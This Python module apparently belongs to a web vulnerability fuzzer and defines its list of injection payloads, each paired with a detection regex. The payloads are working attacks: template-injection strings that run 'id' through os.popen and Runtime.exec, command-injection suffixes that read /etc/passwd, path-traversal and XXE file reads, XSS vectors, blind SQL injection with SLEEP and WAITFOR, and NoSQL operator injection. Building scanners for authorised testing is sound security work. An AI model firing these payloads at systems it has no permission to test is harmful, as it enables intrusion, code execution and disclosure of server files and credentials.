"""Injection payloads for the ``fuzz`` tool.

Ported from jet-pentest's ``assets/payloads.json`` detection model, extended with
boxcutter's broader SSTI / SQLi-timing / XXE coverage. Every entry is a dict::

    {"class": <lower-case class>, "payload": <template>, "pattern": <regex|None>}

Markers resolved per-shot by the fuzzer (``tools/fuzz.py``):

  - ``{RANDOM}``      a fresh random integer; the same value is substituted into
                      the ``pattern`` so a hit proves the payload was reflected
                      verbatim (XSS, client-side template injection).
  - ``EXPR`` / ``{EXPR_VALUE}``  a random arithmetic expression (e.g. ``417*932``)
                      and its product; a hit on the product proves evaluation (SSTI).
  - ``{TIME}``        a sleep value; these are split out as *time-based* payloads
                      and confirmed by monotonic response-time scaling, not a pattern.

A payload with no ``pattern`` and no ``{TIME}`` marker is never reported on its
own (it would have no signal); the only pattern-less entries here are time-based.
"""

from __future__ import annotations

import re

# -- shared response fingerprints (DRY: jet's JSON repeated these inline) -----

# Error-based SQLi fingerprint across MySQL/Postgres/MSSQL/Oracle/SQLite/DB2/...
SQL_ERROR = (
    r"(?i)PDOException|SQLSTATE\[|SQL syntax.*?MySQL|Warning.*?\Wmysqli?_|"
    r"MySQLSyntaxErrorException|valid MySQL result|check the manual that "
    r"(?:corresponds to|fits) your MySQL server version|Unknown column .+ in "
    r".field list\.|com\.mysql\.jdbc|PostgreSQL.*?ERROR|Warning.*?\Wpg_|"
    r"valid PostgreSQL result|Npgsql\.|PG::SyntaxError:|"
    r"org\.postgresql\.util\.PSQLException|ERROR:\s\ssyntax error at or near|"
    r"Driver.*? SQL[\-_ ]*Server|OLE DB.*? SQL Server|Warning.*?\W(?:mssql|sqlsrv)_|"
    r"Unclosed quotation mark after the character string|\bORA-\d{5}|Oracle error|"
    r"quoted string not properly terminated|SQL command not properly ended|"
    r"CLI Driver.*?DB2|DB2 SQL error|Dynamic SQL Error|org\.firebirdsql\.jdbc|"
    r"SQLite/JDBCDriver|SQLite\.Exception|SQLITE_ERROR|sqlite3\.OperationalError|"
    r"Syntax error: Encountered|org\.apache\.derby|ERROR 42X01|Sybase message|"
    r"Ingres SQLSTATE"
)

# Output of `id` (RCE / SSTI code-exec) and of reading /etc/passwd (LFI / XXE).
CMD_ID = r"uid=\d+\([a-zA-Z0-9_-]+\)\s*(?:gid=|groups=)"
PASSWD = r"root:.*?:0:0:"
WIN_INI = r"for 16-bit app support"

# Unhandled-exception / debug-trace disclosure across common stacks.
ERR_DISCLOSURE = (
    r"(?i)Traceback \(most recent call last\)|Fatal error:|Parse error:|"
    r"in /[a-zA-Z0-9_/.-]{5,}\.php on line \d+|Undefined (?:variable|index|offset):|"
    r"Call to undefined|Whoops[,!]|NullPointerException|ClassCastException|"
    r"ArrayIndexOutOfBoundsException|ActiveRecord::RecordNotFound|"
    r"ActionController::RoutingError|django\.[a-z]+\.[A-Za-z]+Error|"
    r"An unhandled exception occurred|UnhandledPromiseRejectionWarning|\$_SERVER\["
)

# NoSQL (MongoDB et al.) operator-injection error fingerprint.
NOSQL_ERR = (
    r"(?i)MongoError|BSONTypeError|CastError|\$where is not allowed|"
    r"TypeError.*is not a function|E11000 duplicate|cannot use.*\$"
)


# -- per-class builders -------------------------------------------------------

def _entry(cls: str, payload: str, pattern: str | None = None) -> dict:
    return {"class": cls, "payload": payload, "pattern": pattern}


def _xss(payload: str) -> dict:
    """Build a reflected-XSS entry whose pattern is the payload itself, regex-
    escaped but keeping the ``{RANDOM}`` marker literal so it can be substituted."""
    pattern = re.escape(payload).replace(re.escape("{RANDOM}"), "{RANDOM}")
    return _entry("xss", payload, pattern)


def all_payloads() -> list[dict]:
    payloads: list[dict] = []

    # -- SSTI: expression evaluation (hit on the product proves evaluation) ----
    for tpl in [
        "{{EXPR}}", "${EXPR}", "<%= EXPR %>", "#{EXPR}", "{{{EXPR}}}", "${{EXPR}}",
        "[[EXPR]]", "{{=EXPR}}", "#set($x=EXPR)${x}", "@(EXPR)", "{@EXPR}", "*{EXPR}",
        "[% EXPR %]", "[%= EXPR %]", "<?=EXPR?>", "${= EXPR}", "{{# EXPR }}",
        "<% EXPR %>", "<# EXPR #>", "[- EXPR -]", "[=EXPR]", "]][[ EXPR ]]", "{EXPR}",
        "{{% EXPR %}}", "{{<% EXPR %>}}", "${xyz|EXPR}", "}}{{EXPR}}{{",
    ]:
        payloads.append(_entry("ssti", tpl, "{EXPR_VALUE}"))

    # -- SSTI: code execution --------------------------------------------------
    for tpl in [
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
        "<%= system('id') %>",
    ]:
        payloads.append(_entry("ssti", tpl, CMD_ID))

    # -- XSS: reflected --------------------------------------------------------
    for tpl in [
        "<script>alert({RANDOM})</script>",
        '"><img src=x onerror=alert({RANDOM})>',
        "'><svg onload=alert({RANDOM})>",
        "</textarea><script>alert({RANDOM})</script>",
        '" onmouseover="alert({RANDOM})"',
    ]:
        payloads.append(_xss(tpl))

    # -- SQLi: error-based -----------------------------------------------------
    for tpl in ["'", '"', ";", "' OR 1=1--", "' UNION SELECT NULL--"]:
        payloads.append(_entry("sqli", tpl, SQL_ERROR))
    payloads.append(_entry("sqli", "' UNION SELECT 1,user(),database()--",
                           r"(?i)root@|information_schema"))

    # -- SQLi: time-based blind (confirmed by response-time scaling) -----------
    for tpl in [
        # MySQL / MariaDB - integer context
        "1 AND SLEEP({TIME})",
        "1 AND (SELECT*FROM(SELECT(SLEEP({TIME})))a)",
        "1 AND 0 IN (SELECT SLEEP({TIME}))-- -",
        # MySQL / MariaDB - single-quote string context
        "1' AND SLEEP({TIME})-- -",
        "1' AND SLEEP({TIME}) AND '1'='1",
        # MySQL - XOR bypass
        "1' XOR(IF(NOW()=SYSDATE(),SLEEP({TIME}),0))XOR'Z",
        # MySQL / MariaDB - double-quote string context
        '1" AND SLEEP({TIME}) AND "1"="1',
        # PostgreSQL
        "1 OR pg_sleep({TIME})-- -",
        "1'; SELECT pg_sleep({TIME})-- -",
        # MSSQL
        "1; WAITFOR DELAY '0:0:{TIME}'-- -",
        "1'; WAITFOR DELAY '0:0:{TIME}'-- -",
    ]:
        payloads.append(_entry("sqli", tpl))

    # -- LFI / path traversal --------------------------------------------------
    for tpl in [
        "/etc/passwd",
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "/../../../../etc/passwd",
        "../../../etc/passwd%00",
        "%252e%252e%252fetc%252fpasswd",
    ]:
        payloads.append(_entry("lfi", tpl, PASSWD))

    # -- RCE: command injection ------------------------------------------------
    for tpl in [";id", "|id", "&&id", "$(id)", "`id`", "\nid"]:
        payloads.append(_entry("rce", tpl, CMD_ID))
    for tpl in ["; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd",
                "; cat${IFS}/etc/passwd"]:
        payloads.append(_entry("rce", tpl, PASSWD))
    payloads.append(_entry("rce", "& whoami /all", r"(?i)NT AUTHORITY|BUILTIN\\"))

    # -- XXE -------------------------------------------------------------------
    payloads.append(_entry("xxe",
        '<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><x>&xxe;</x>',
        PASSWD))
    payloads.append(_entry("xxe",
        '<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><x>&xxe;</x>',
        WIN_INI))
    payloads.append(_entry("xxe",
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY >'
        '<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>', PASSWD))
    payloads.append(_entry("xxe",
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///etc/passwd"/></foo>', PASSWD))
    payloads.append(_entry("xxe",
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///C:/Windows/win.ini"/></foo>', WIN_INI))

    # -- Error / debug-trace disclosure ----------------------------------------
    for tpl in ["null", "undefined", ")(#{", '{"a":1}', '<?xml version="1.0"?>',
                "\\u0000", "-1", "9999999999", "0.0/0", "'", '"', "../", "../../../../"]:
        payloads.append(_entry("errdisclosure", tpl, ERR_DISCLOSURE))

    # -- NoSQL operator injection ----------------------------------------------
    for tpl in ["[$ne]=x", '{"$gt":""}', "[$regex]=.*"]:
        payloads.append(_entry("nosql", tpl, NOSQL_ERR))
    payloads.append(_entry("nosql", "[$where]=sleep({TIME}000)"))  # time-based

    # -- GraphQL ---------------------------------------------------------------
    payloads.append(_entry("graphql", "{__typename}", r"\"__typename\""))
    payloads.append(_entry("graphql", "{__schema{types{name}}}",
                           r"(?i)\"__Schema\"|\"queryType\"|\"__Type\"|\"__schema\""))
    payloads.append(_entry("graphql", "{__schema{queryType{name}types{name kind}}}",
                           r"(?i)\"__schema\"|\"queryType\""))
    payloads.append(_entry("graphql", "{thisdefinitelydoesnotexist}",
                           r"(?i)Did you mean|Cannot query field|\"errors\".*\"message\""))
    payloads.append(_entry("graphql", "query{users{id email}}",
                           r"(?i)\"users\":\[|\"email\":\""))
    payloads.append(_entry("graphql", "mutation{__typename}", r"\"__typename\""))

    return payloads
